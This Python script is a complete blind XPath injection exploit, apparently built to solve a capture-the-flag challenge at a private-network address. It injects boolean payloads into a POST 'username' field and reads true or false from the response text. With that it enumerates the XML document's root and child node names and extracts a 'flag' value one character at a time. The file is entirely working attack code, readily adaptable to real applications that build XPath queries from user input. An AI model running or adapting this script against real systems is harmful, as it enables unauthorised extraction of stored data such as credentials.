import requests
import re


class XPathBlindInjector:
    def __init__(self, url):
        self.url = url
        self.chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$'
        
    def test_payload(self, payload):
        """Test if payload returns true"""
        r = requests.post(self.url, data={'username': payload, 'msg': 'test'})
        return 'Message successfully sent!' in r.text
    
    def find_length(self, xpath_query):
        """Find length of XPath result"""
        for length in range(1, 50):
            payload = f"invalid' or string-length({xpath_query})={length} and '1'='1"
            if self.test_payload(payload):
                return length
        return 0
    
    def extract_string(self, xpath_query, length):
        """Extract string character by character"""
        result = ''
        for i in range(1, length+1):
            for c in self.chars:
                payload = f"invalid' or substring({xpath_query},{i},1)='{c}' and '1'='1"
                if self.test_payload(payload):
                    result += c
                    print(f"[+] Position {i}/{length}: {c} -> {result}")
                    break
        return result
    
    def count_nodes(self, xpath_query):
        """Count number of nodes"""
        for count in range(1, 20):
            payload = f"invalid' or count({xpath_query})={count} and '1'='1"
            if self.test_payload(payload):
                return count
        return 0
    
    def exploit(self):
        print("[*] Starting XPath Blind Injection Exploitation")
        print("=" * 50)
        
        # Step 1: Find root node
        print("\n[*] Step 1: Finding root node name...")
        root_length = self.find_length("name(/*[1])")
        print(f"[+] Root node length: {root_length}")
        root_name = self.extract_string("name(/*[1])", root_length)
        print(f"[✓] Root node: {root_name}\n")
        
        # Step 2: Count children
        print("[*] Step 2: Counting child elements...")
        child_count = self.count_nodes(f"/{root_name}/*[1]/*")
        print(f"[✓] Total children: {child_count}\n")
        
        # Step 3: Extract child names
        print("[*] Step 3: Extracting child element names...")
        children = []
        for pos in range(1, child_count+1):
            child_length = self.find_length(f"name(/{root_name}/*[1]/*[{pos}])")
            child_name = self.extract_string(f"name(/{root_name}/*[1]/*[{pos}])", child_length)
            children.append(child_name)
            print(f"[✓] Child {pos}: {child_name}")
        
        # Step 4: Extract flag
        if 'flag' in children:
            print("\n[*] Step 4: Extracting flag value...")
            flag_length = self.find_length(f"/{root_name}/*[1]/flag/text()")
            print(f"[+] Flag length: {flag_length}")
            flag = self.extract_string(f"/{root_name}/*[1]/flag/text()", flag_length)
            print(f"\n{'='*50}")
            print(f"[✓✓✓] FLAG CAPTURED: {flag}")
            print(f"{'='*50}")
        else:
            print("[!] No flag element found")


# Run exploitation
if __name__ == "__main__":
    injector = XPathBlindInjector("http://192.168.0.100:8000/message")
    injector.exploit()
